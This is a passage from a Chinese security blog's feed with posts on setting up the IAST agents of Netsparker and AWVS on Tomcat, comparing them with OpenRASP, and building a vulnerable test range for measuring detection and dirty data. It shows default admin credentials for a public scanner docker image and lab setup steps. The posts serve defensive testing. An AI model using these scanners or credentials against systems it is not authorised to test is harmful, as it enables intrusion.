class="line"><span class="attribute">Copy</span> aspectjweaver and paste it intoC:\Program Files (x<span class="number">86</span>)\Apache Software Foundation\Tomcat <span class="number">9</span>.<span class="number">0</span>/lib</span><br><span class="line"><span class="attribute">2</span>. Deploying Shark into your web server</span><br><span class="line"></span><br><span class="line"><span class="attribute">Download</span> the Netsparker Shark JAVA from Netsparker</span><br><span class="line"><span class="attribute">Copy</span> the Netsparker Shark JAVA (Shark.jar) to %TOMCAT-HOME%\lib</span><br><span class="line"><span class="attribute">If</span> installing <span class="literal">on</span> Windows where Tomcat <span class="number">9</span> was installed using the official <span class="string">&quot;32-bit/64-bit Windows Service Installer&quot;</span>, copy the Shark.jar file to C:\Program Files (x<span class="number">86</span>)\Apache Software Foundation\Tomcat <span class="number">9</span>.<span class="number">0</span>\lib  </span><br></pre></td></tr></table></figure><p><img src="https://pic.rmb.bdstatic.com/bjh/84ae6b186f82be98819cae4525abb30f.png" alt="image.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span> Configuring Tomcat <span class="keyword">to</span> use AspectJWeaver <span class="keyword">and</span> Shark</span><br><span class="line"></span><br><span class="line">Launch Tomcat <span class="keyword">with</span> <span class="keyword">Load</span> <span class="type">Time</span> Weaving enabled. This can be done <span class="keyword">by</span> adding a -javaagent parameter <span class="keyword">with</span> the <span class="type">path</span> <span class="keyword">to</span> aspectjweaver.jar <span class="keyword">when</span> launching Tomcat, <span class="keyword">and</span> optionally a parameter <span class="keyword">to</span> <span class="keyword">enable</span> the Shark <span class="keyword">debug</span> logging.</span><br><span class="line"><span class="keyword">Add</span> two parameters <span class="keyword">into</span> the Apache Tomcat <span class="keyword">Configuration</span> &gt; Java <span class="keyword">options</span> tab</span><br><span class="line">-javaagent: C:\Program Files (x86)\Apache Software Foundation\Tomcat <span class="number">9.0</span>\lib\aspectjweaver.jar (mandatory; adjust <span class="type">path</span> depending <span class="keyword">on</span> <span class="keyword">where</span> you deployed the aspectjweaver.jar file)</span><br><span class="line">-Dacusensor.<span class="keyword">debug</span>.<span class="keyword">log</span>=<span class="keyword">ON</span> (optional; enables <span class="keyword">debug</span> logging)</span><br></pre></td></tr></table></figure><p><img src="https://pic.rmb.bdstatic.com/bjh/4cc0ba3610fe44ea609e6ab91587b553.png" alt="image.png"></p><p>这里也在配置awvs时配置过了，跳过</p><p><code>Restart the Tomcat service</code></p><blockquote><p>The parameter “-Dacusensor.debug.log=ON” is optional and can be omitted. If this parameter is retained, this will output the Shark logging as additional lines in the Tomcat logs starting with “[Netsparker-debug]”.</p></blockquote><h3 id="2-3-删除agent"><a href="#2-3-删除agent" class="headerlink" title="2.3 删除agent"></a>2.3 删除agent</h3><p>Disabling and Removing Netsparker Shark for Java</p><p>To remove and disable the sensor from your website, you need to revert the changes done during the deployment of the Agent.</p><ul><li>Remove the Netsparker Shark (Shark.jar) from the folder where it was deployed</li><li>Remove aspectjweaver.jar from the folder where it was copied to</li><li>Reconfigure Tomcat with Load Time Weaving disabled, as follows:<ul><li>Remove the -javaagent and -Dacusensor.debug.log parameters in the Apache Tomcat Configuration &gt; Java options tab</li><li>Restart the Tomcat service<blockquote><p>Although the Netsparker Shark agent is secured with a strong password, it is recommended that the Shark client files are uninstalled and removed from the web application if they are no longer in use.</p></blockquote></li></ul></li></ul><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p><img src="https://pic.rmb.bdstatic.com/bjh/44e7754f0eabea70e0c678072e938ffd.png" alt="image.png"></p><p>配置完成之后如果直接点击<code>start scan</code> ，会类似AWVS的iast一样，先通过dast，然后再通过iast增加漏洞的准确性，这里依然会产生大量请求和脏数据</p><p>这里有一个<strong>代理模式</strong>，选择</p><p><img src="https://pic.rmb.bdstatic.com/bjh/1937f78c4aa267dad7870488a4d36bd4.png" alt="image.png"></p><p>首次打开会弹出安装证书</p><p><img src="https://pic.rmb.bdstatic.com/bjh/3459f2f6f0887b1855c25afa67902fa4.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/7bae47bbd0df8d377f951e489474558a.png" alt="image.png"></p><p>打开浏览器，设置代理， 10010端口，访问待测系统</p><p><img src="https://pic.rmb.bdstatic.com/bjh/8c08345d2e4980a127f42e21d8555a4a.png" alt="image.png"></p><p>流量抓取完成，开始扫描</p><p><img src="https://pic.rmb.bdstatic.com/bjh/4f398d507beedd723aa6d4c89e28768a.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/c67fbf0b426720f54a29481ee4c44f40.png" alt="image.png"></p><p>这里单独使用iast的sql注入规则，产生8条脏数据</p><p><img src="https://pic.rmb.bdstatic.com/bjh/c7bc57ee86deea9a5f9df71fcee80ccb.png" alt="image.png"></p><p>IAST相关规则</p><p><img src="https://pic.rmb.bdstatic.com/bjh/bb00fa48b60cf38beab883d434832811.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;之前测试了AWVS扫描器的IAST功能，使用上不是很方便，需要对每个服务启动一个扫描任务才可以进行扫描，比较主动，无法作为独立的被动式扫描器使用，脏数据也是比较多&lt;/p&gt;
&lt;p&gt;对比awvs和netsparker，在前后端分离场景下，awvs扫描器可以分析swagger文件进行全接口自动化安全扫描，开发人员可以使用该功能增加后端系统的安全测试效率。在多人协作的测试场景下，netsparker扫描器可以开启代理端口，充分导入有效流量进行自动化安全测试，发现隐蔽的安全漏洞&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>AWVS扫描器IAST使用</title>
    <link href="http://www.pa55w0rd.online/awvs-iast/"/>
    <id>http://www.pa55w0rd.online/awvs-iast/</id>
    <published>2021-05-14T02:12:17.000Z</published>
    <updated>2021-05-14T02:53:15.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>很久没有更新blog了，这次把几个笔记分享一下，AWVS自带的IAST功能，很多人都不知道，这里记录一下IAST如何使用</p><span id="more"></span><h2 id="0x01-扫描器部署"><a href="#0x01-扫描器部署" class="headerlink" title="0x01 扫描器部署"></a>0x01 扫描器部署</h2><p>这里笔记写的较早，版本还是awvs13</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> pull 拉取下载镜像</span></span><br><span class="line">docker pull secfa/docker-awvs</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 将Docker的3443端口映射到物理机的 13443端口</span></span><br><span class="line">docker run -it -d -p 13443:3443 secfa/docker-awvs</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 容器的相关信息</span></span><br><span class="line">awvs13 username: admin@admin.com</span><br><span class="line">awvs13 password: Admin123</span><br><span class="line">AWVS版本：13.0.201006145</span><br></pre></td></tr></table></figure><p>浏览器访问</p><p><a href="https://192.168.244.130:13443/#/login">https://192.168.244.130:13443/#/login</a></p><p><img src="https://pic.rmb.bdstatic.com/bjh/8c9714c2e8c1c31f9285e8490a784641.png" alt="image.png"></p><h2 id="0x02-开启IAST插装模式"><a href="#0x02-开启IAST插装模式" class="headerlink" title="0x02 开启IAST插装模式"></a>0x02 开启IAST插装模式</h2><h3 id="2-1-新建目标"><a href="#2-1-新建目标" class="headerlink" title="2.1 新建目标"></a>2.1 新建目标</h3><p><img src="https://pic.rmb.bdstatic.com/bjh/42a953e902464cb9c846984760d44fad.png" alt="image.png"></p><h3 id="2-2-开启AcuSensor"><a href="#2-2-开启AcuSensor" class="headerlink" title="2.2 开启AcuSensor"></a>2.2 开启AcuSensor</h3><p>AcuSensor 允许扫描程序从您的 PHP、.NET 或 Java web 应用程序收集更多信息，用于改善扫描结果，并减少误报。请于运行 Web 扫描前，下载并安装与目标对应的 AcuSensor。</p><p>注意：避免在生产系统中使用 AcuSensor。</p><p>使用介绍：<code>https://www.acunetix.com/support/docs/installing-acusensor/</code></p><p>针对JAVA程序使用：<code>https://www.acunetix.com/support/docs/installing-acusensor-java/</code></p><p>传感器是针对每个网站唯一生成的</p><p>Acunetix JAVA Acusensor需要Tomcat（7+）和Java（1.7+）</p><p><img src="https://pic.rmb.bdstatic.com/bjh/de790e1ae062fe4ffafd994a6795f5c7.png" alt="image.png"></p><h3 id="2-3-安装切面和传感器"><a href="#2-3-安装切面和传感器" class="headerlink" title="2.3 安装切面和传感器"></a>2.3 安装切面和传感器</h3><p>Java AcuSensor要求：</p><p>将<code>Aspectjweaver.jar</code>部署到您的Web服务器中-提供<code>AcuSensor</code>与您的应用程序一起使用所需的集成<br>将<code>Acunetix Java AcuSensor</code>部署到Web服务器中-这对于每个Target都是唯一的，可以使用“<code>下载JAVA AcuSensor</code>”按钮进行下载<br>配置您的Web服务器以使用加载时间编织（<code>AspectJWeaver</code>）</p><p><a href="https://www.acunetix.com/support/docs/wvs/deploying-acusensor-java-centos-rhel/">https://www.acunetix.com/support/docs/wvs/deploying-acusensor-java-centos-rhel/</a></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2.3</span><span class="number">.1</span> Deploying AspectJWeaver <span class="keyword">into</span> your web application</span><br><span class="line"></span><br><span class="line">To download <span class="keyword">and</span> deploy AspectJWeaver, run <span class="keyword">the</span> following commands:</span><br><span class="line"></span><br><span class="line">wget -c <span class="keyword">https</span>://repo1.maven.org/maven2/org/aspectj/aspectjweaver/<span class="number">1.9</span><span class="number">.5</span>/aspectjweaver<span class="number">-1.9</span><span class="number">.5</span>.jar</span><br><span class="line">sudo mv aspectjweaver<span class="number">-1.9</span><span class="number">.5</span>.jar /opt/tomcat9/lib</span><br><span class="line">sudo <span class="built_in">ln</span> -s /opt/tomcat9/lib/aspectjweaver<span class="number">-1.9</span><span class="number">.5</span>.jar /opt/tomcat9/lib/aspectjweaver.jar</span><br><span class="line"><span class="number">2.3</span><span class="number">.2</span>  Deploying AcuSensor <span class="keyword">into</span> your web application</span><br><span class="line"></span><br><span class="line">Download <span class="keyword">the</span> Acunetix JAVA AcuSensor <span class="built_in">from</span> <span class="keyword">the</span> Acunetix UI</span><br><span class="line">Copy <span class="keyword">the</span> Acunetix JAVA AcuSensor (AcuSensor.jar) <span class="built_in">to</span> %TOMCAT-HOME%\lib - based <span class="keyword">on</span> <span class="title">the</span> <span class="title">assumptions</span> <span class="title">above</span>, <span class="title">you</span> <span class="title">would</span> <span class="title">copy</span> <span class="title">the</span> <span class="title">AcuSensor</span>.<span class="title">jar</span> <span class="title">file</span> <span class="title">to</span> /<span class="title">opt</span>/<span class="title">tomcat9</span>/<span class="title">lib</span></span><br><span class="line"><span class="number">2.3</span><span class="number">.3</span> Configure Tomcat <span class="built_in">to</span> use AspectJWeaver <span class="keyword">and</span> AcuSensor</span><br><span class="line"></span><br><span class="line">Launch Tomcat <span class="keyword">with</span> Load Time Weaving enabled. This can be done <span class="keyword">by</span> adding <span class="keyword">a</span> -javaagent parameter <span class="keyword">with</span> <span class="keyword">the</span> path <span class="built_in">to</span> aspectjweaver.jar when launching Tomcat, <span class="keyword">and</span> optionally <span class="keyword">a</span> parameter <span class="built_in">to</span> enable AcuSensor debug logging</span><br><span class="line">For Centos <span class="number">8.1</span> <span class="keyword">and</span> RHEL <span class="number">8.1</span>, you will need <span class="built_in">to</span> <span class="built_in">add</span> <span class="number">2</span> parameters <span class="keyword">into</span> <span class="keyword">the</span> Tomcat setenv.sh script (normally you will be creating <span class="keyword">a</span> <span class="built_in">new</span> <span class="built_in">file</span>):</span><br><span class="line">run <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">sudo</span> <span class="title">nano</span> /<span class="title">opt</span>/<span class="title">tomcat9</span>/<span class="title">bin</span>/<span class="title">setenv</span>.<span class="title">sh</span></span><br><span class="line"><span class="keyword">at</span> <span class="keyword">the</span> <span class="function"><span class="keyword">end</span> <span class="title">of</span> <span class="title">the</span> <span class="title">file</span>, <span class="title">add</span> <span class="title">the</span> <span class="title">line</span>: <span class="title">JAVA_OPTS</span>=&quot;$<span class="title">JAVA_OPTS</span> -<span class="title">javaagent</span>:$<span class="title">CATALINA_HOME</span>/<span class="title">lib</span>/<span class="title">aspectjweaver</span>.<span class="title">jar</span> -<span class="title">Dacusensor</span>.<span class="title">debug</span>.<span class="title">log</span>=<span class="title">ON</span>&quot;</span></span><br><span class="line">save <span class="keyword">the</span> <span class="built_in">file</span></span><br><span class="line">run <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">sudo</span> <span class="title">systemctl</span> <span class="title">restart</span> <span class="title">tomcat9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Note: The parameter <span class="string">&quot;-Dacusensor.debug.log=ON&quot;</span> is optional, <span class="keyword">and</span> can be omitted. If this parameter is retained, this will output AcuSensor logging <span class="keyword">as</span> additional <span class="keyword">lines</span> <span class="keyword">in</span> <span class="keyword">the</span> Tomcat logs starting <span class="keyword">with</span> <span class="string">&quot;[Acunetix-debug]&quot;</span>.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">2.3</span><span class="number">.4</span> Disabling <span class="keyword">and</span> Removing AcuSensor <span class="keyword">for</span> JAVA</span><br><span class="line"></span><br><span class="line">To remove <span class="keyword">and</span> disable <span class="keyword">the</span> sensor <span class="built_in">from</span> your website you need <span class="built_in">to</span> revert <span class="keyword">the</span> changes done during <span class="keyword">the</span> deployment <span class="keyword">of</span> <span class="keyword">the</span> Agent. Based <span class="keyword">on</span> <span class="title">the</span> <span class="title">assumptions</span> <span class="title">above</span>:</span><br><span class="line"></span><br><span class="line">Remove <span class="keyword">the</span> Acunetix JAVA AcuSensor (AcuSensor.jar) <span class="built_in">from</span> <span class="keyword">the</span> <span class="built_in">folder</span> where <span class="keyword">it</span> was deployed <span class="keyword">with</span>:</span><br><span class="line">rm /opt/tomcat9/lib/AcuSensor.jar</span><br><span class="line">Remove aspectjweaver.jar <span class="keyword">with</span>:</span><br><span class="line">sudo rm /opt/tomcat9/lib/aspectjweaver.jar</span><br><span class="line">sudo rm /opt/tomcat9/lib/aspectjweaver<span class="number">-1.9</span><span class="number">.5</span>.jar</span><br><span class="line">Reconfigure Tomcat <span class="keyword">with</span> Load Time Weaving disabled:</span><br><span class="line">remove <span class="keyword">the</span> <span class="string">&quot;JAVA_OPTS&quot;</span> <span class="built_in">line</span> added earlier <span class="keyword">in</span> <span class="keyword">the</span> setenv.sh <span class="built_in">file</span></span><br><span class="line">run <span class="keyword">the</span> <span class="keyword">command</span>: <span class="title">sudo</span> <span class="title">systemctl</span> <span class="title">restart</span> <span class="title">tomcat9</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Note: Although <span class="keyword">the</span> Acunetix AcuSensor agent is secured <span class="keyword">with</span> <span class="keyword">a</span> strong password, <span class="keyword">it</span> is recommended that <span class="keyword">the</span> AcuSensor client <span class="built_in">files</span> are uninstalled <span class="keyword">and</span> removed <span class="built_in">from</span> <span class="keyword">the</span> web application <span class="keyword">if</span> they are no longer <span class="keyword">in</span> use.</span><br></pre></td></tr></table></figure><p>注：官方案例中使用tomcat9 ，本地tomcat8中未找到改sh文件</p><p>这里在catalina.sh中cygwin=false这行上面加入以下代码</p><p><code>JAVA_OPTS=&quot;$JAVA_OPTS -javaagent:/www/server/tomcat/lib/aspectjweaver.jar -Dacusensor.debug.log=ON&quot;</code></p><p>这里重启tomcat即可开始iast插装扫描</p><h2 id="0x03-测试"><a href="#0x03-测试" class="headerlink" title="0x03 测试"></a>0x03 测试</h2><p>对比awvs扫描，开启AcuSensor，开启后扫描目标会有<code>AcuSensor</code>图标</p><p><img src="https://pic.rmb.bdstatic.com/bjh/cf34afa5fd88b0d931bf7160ddf23887.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/53e2bc0b2e7e33b6d9eb2c7ef5003da4.png" alt="image.png"></p><p><img src="https://pic.rmb.bdstatic.com/bjh/11c045db00fdb26ff3bdbd5b4d1c9ee9.png" alt="image.png"></p><p>为了确保漏洞覆盖，这里使用<code>BURP</code>录制一份测试靶场的流量，导入到AWVS中</p><p><img src="https://pic.rmb.bdstatic.com/bjh/77066693b682cc7a368444a91c3a1672.png" alt="image.png"></p><p>新建目标，导入文件</p><p><img src="https://pic.rmb.bdstatic.com/bjh/92a7c4bf7e362b603109cf1a100bd4ba.png" alt="image.png"></p><h2 id="0x04-测试结果"><a href="#0x04-测试结果" class="headerlink" title="0x04 测试结果"></a>0x04 测试结果</h2><h3 id="4-1-常规漏洞项测试"><a href="#4-1-常规漏洞项测试" class="headerlink" title="4.1 常规漏洞项测试"></a>4.1 常规漏洞项测试</h3><blockquote><p>默认配置，结果不准确</p></blockquote><table><thead><tr><th>常规漏洞测试项</th><th>扫描结果</th><th>IAST检测</th></tr></thead><tbody><tr><td>目录遍历</td><td>√</td><td>√</td></tr><tr><td>任意文件读取</td><td>√</td><td>√</td></tr><tr><td>命令执行</td><td>×</td><td>×</td></tr><tr><td>XXE</td><td>×</td><td>×</td></tr><tr><td>文件上传</td><td>√</td><td>×</td></tr><tr><td>反序列化漏洞</td><td>×</td><td>×</td></tr><tr><td>ssrf</td><td>×</td><td>×</td></tr><tr><td>sql注入</td><td>√</td><td>√</td></tr><tr><td>xss</td><td>√</td><td>×</td></tr><tr><td>struts命令执行</td><td>√</td><td>×</td></tr><tr><td>fastjson反序列化</td><td>×</td><td>×</td></tr><tr><td>逻辑漏洞（越权）</td><td>×</td><td>×</td></tr></tbody></table><h3 id="4-2-脏数据测试"><a href="#4-2-脏数据测试" class="headerlink" title="4.2 脏数据测试"></a>4.2 脏数据测试</h3><p>根据openrasp靶场修改一下，进行insert操作</p><p><a href="http://192.168.244.129:8080/vulns/insert.jsp">http://192.168.244.129:8080/vulns/insert.jsp</a></p><p><img src="https://pic.rmb.bdstatic.com/bjh/dce7355d473b9fe072f3715184461a62.png" alt="image.png"></p><p>查询数据库，可以看到表内有3条数据</p><p><img src="https://pic.rmb.bdstatic.com/bjh/cdaa6d8beb56333840c10e2524421dd2.png" alt="image.png"></p><p>开启IAST扫描</p><p><img src="https://pic.rmb.bdstatic.com/bjh/67ed97d4628fe548ced691984652939b.png" alt="image.png"></p><p>依赖awvs主动扫描，这里插入了340条脏数据</p><blockquote><p>这里测试时，扫描规则为默认，实际脏数据可能会少些</p></blockquote><p><img src="https://pic.rmb.bdstatic.com/bjh/82376b7e97194b438590f6fa28457033.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;很久没有更新blog了，这次把几个笔记分享一下，AWVS自带的IAST功能，很多人都不知道，这里记录一下IAST如何使用&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>百度开源OpenRASP - IAST使用</title>
    <link href="http://www.pa55w0rd.online/openrasp-iast/"/>
    <id>http://www.pa55w0rd.online/openrasp-iast/</id>
    <published>2021-05-14T02:00:30.000Z</published>
    <updated>2021-05-14T03:25:54.451Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>相对于awvs和netsparker的IAST，百度iast为主动型插桩技术，无需人工配置任务及代理等，由agent采集请求及hook点信息，自动选择扫描漏洞类型，极大的增加覆盖率和效率，减少脏数据产生</p><p>主动型扫描，不适用于参数加密、编码、防重放等场景</p><p>管理后台部署参考 <a href="https://www.pa55w0rd.online/openrasp-web/">OpenRASP 部署</a></p><span id="more"></span><h2 id="0x01-开启灰盒扫描"><a href="#0x01-开启灰盒扫描" class="headerlink" title="0x01 开启灰盒扫描"></a>0x01 开启灰盒扫描</h2><p>参考 <a href="https://rasp.baidu.com/doc/install/iast.html">安装灰盒扫描工具</a></p><table><thead><tr><th>项目</th><th>IAST</th><th>SAST</th><th>DAST</th></tr></thead><tbody><tr><td>测试覆盖度</td><td>高，由功能测试覆盖度保障</td><td>高</td><td>低</td></tr><tr><td>检出率</td><td>高</td><td>高</td><td>中</td></tr><tr><td>误报率</td><td>低</td><td>高，需要编写规则</td><td>低</td></tr><tr><td>扫描效率</td><td>准实时检测</td><td>非实时，与程序复杂度、代码量相关</td><td>非实时，程序越复杂，安全测试用例就越多</td></tr><tr><td>扫描报告</td><td>包含动态数据流、请求响应、应用代码信息</td><td>只有静态代码信息</td><td>只有请求和响应信息</td></tr><tr><td>并发检测</td><td>资源消耗分布端上，可支持上百个任务</td><td>CPU 消耗较大</td><td>网络资源消耗</td></tr><tr><td>语言支持</td><td>区分不同语</td><td>区分不同语</td><td>不区分语言</td></tr><tr><td>框架支持</td><td>一定程度区分</td><td>一定程度区分</td><td>不区分框架</td></tr><tr><td>使用风险</td><td>无</td><td>无</td><td>脏数据、大流量</td></tr><tr><td>使用成本</td><td>低，基本没有误报</td><td>高，人工排查误报</td><td>低</td></tr><tr><td>开发流程集成度</td><td>无缝集成开发和测试阶段，零成本完成</td><td>安全测试</td><td>开发阶段，成本较高    测试阶段，成本较高</td></tr></tbody></table><blockquote><p>通过综合对比，IAST 不仅解决了传统 DAST 无法精确定位漏洞位置的问题，还有着比传统 SAST 技术低得多的误报率。在脏数据处理、对系统稳定性影响更小，这里对IAST产品做调研</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;相对于awvs和netsparker的IAST，百度iast为主动型插桩技术，无需人工配置任务及代理等，由agent采集请求及hook点信息，自动选择扫描漏洞类型，极大的增加覆盖率和效率，减少脏数据产生&lt;/p&gt;
&lt;p&gt;主动型扫描，不适用于参数加密、编码、防重放等场景&lt;/p&gt;
&lt;p&gt;管理后台部署参考 &lt;a href=&quot;https://www.pa55w0rd.online/openrasp-web/&quot;&gt;OpenRASP 部署&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="安全建设" scheme="http://www.pa55w0rd.online/categories/%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/"/>
    
    
    <category term="SDL" scheme="http://www.pa55w0rd.online/tags/SDL/"/>
    
  </entry>
  
  <entry>
    <title>IAST测试靶场搭建</title>
    <link href="http://www.pa55w0rd.online/iast-test/"/>
    <id>http://www.pa55w0rd.online/iast-test/</id>
    <published>2021-05-14T00:53:09.000Z</published>
    <updated>2021-05-14T03:25:50.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>测试用例的选择尽量贴近真实业务使用的场景，覆盖常见的高危漏洞，以及各类请求形式。用于测试IAST产品支持检测漏洞类型、检出率、脏数据插入等等</p><span id="more"></span><h2 id="0x01-靶场选择"><a href="#0x01-靶场选择" class="headerlink" title="0x01 靶场选择"></a>0x01 靶场选择</h2><table><thead><tr><th>靶场</th><th>DVWA</th><th>Openrasp-testcases</th></tr></thead><tbody><tr><td>技术栈</td><td>PHP/MYSQL</td><td>JAVA/PHP/MYSQL</td></tr><tr><td>支持漏洞类型</td><td><a href="https://github.com/digininja/DVWA">https://github.com/digininja/DVWA</a></td><td><a href="https://github.com/baidu-security/openrasp-testcases">https://github.com/baidu-security/openrasp-testcases</a></td></tr></tbody></table><p>考虑到公司使用的技术栈，这里选择了openrasp-testcases用于测试靶场</p><h2 id="0x02-靶场搭建"><a href="#0x02-靶场搭建" class="headerlink" title="0x02 靶场搭建"></a>0x02 靶场搭建</h2><p>环境：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Centos7</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">PHP7</span>.<span class="number">3</span></span><br><span class="line"><span class="attribute">JDK1</span>.<span class="number">8</span></span><br><span class="line"><span class="attribute">MYSQL5</span>.<span class="number">6</span></span><br><span class="line"><span class="attribute">APACHE2</span>.<span class="number">4</span></span><br><span class="line"><span class="attribute">TOMCAT8</span>.<span class="number">5</span></span><br><span class="line"><span class="attribute">MAVEN3</span>.<span class="number">3</span></span><br></pre></td></tr></table></figure><h3 id="2-1-JAVA-测试靶场"><a href="#2-1-JAVA-测试靶场" class="headerlink" title="2.1 JAVA 测试靶场"></a>2.1 JAVA 测试靶场</h3><p>mvn编译</p><p>启动tomcat</p><p>启动mysql</p><p>本地靶场：<a href="http://192.168.244.129:8080/manager/html">http://192.168.244.129:8080/manager/html</a></p><p><img src="https://pic.rmb.bdstatic.com/bjh/7fecbe8550249e2d807eaadd547fcddb.png" alt="image.png"></p><h3 id="2-2-PHP测试靶场"><a href="#2-2-PHP测试靶场" class="headerlink" title="2.2 PHP测试靶场"></a>2.2 PHP测试靶场</h3><p>启动apache</p><p>启动php</p><p>启动mysql</p><p>本地靶场</p><p><a href="http://192.168.244.129/">http://192.168.244.129/</a><br><img src="https://pic.rmb.bdstatic.com/bjh/65b814f3f7c7ad8e621fd3d8e3b4e174.png" alt="image.png"></p><h3 id="2-3-脏数据测试"><a href="#2-3-脏数据测试" class="headerlink" title="2.3 脏数据测试"></a>2.3 脏数据测试</h3><p>产生脏数据的原因大多是执行了 数据库的insert语句，这里使用java简单写一个demo用于测试脏数据</p><p>创建数据库</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">DATABASE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> test;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">DATABASE</span> test;         </span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> test.* <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> test.* <span class="keyword">to</span> <span class="string">&#x27;test&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;test&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> table vuln (</span><br><span class="line">-&gt; <span class="symbol">`id`</span> INT UNSIGNED AUTO_INCREMENT,</span><br><span class="line">-&gt; <span class="symbol">`name`</span> VARCHAR(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">-&gt; <span class="keyword">primary</span> <span class="keyword">key</span>(<span class="symbol">`id`</span>)</span><br><span class="line">-&gt; )ENGINE=InnoDB DEFAULT CHARSET=utf8;</span><br></pre></td></tr></table></figure><p>清空数据，重置ID</p><p>truncate table vuln;</p><p>MySQL服务器执行SQL记录实时监控，或者直接查询数据库</p><p><a href="https://github.com/cw1997/MySQL-Monitor">https://github.com/cw1997/MySQL-Monitor</a></p><p>执行sql语句</p><p>stmt.executeUpdate(“INSERT INTO vuln(name) VALUES 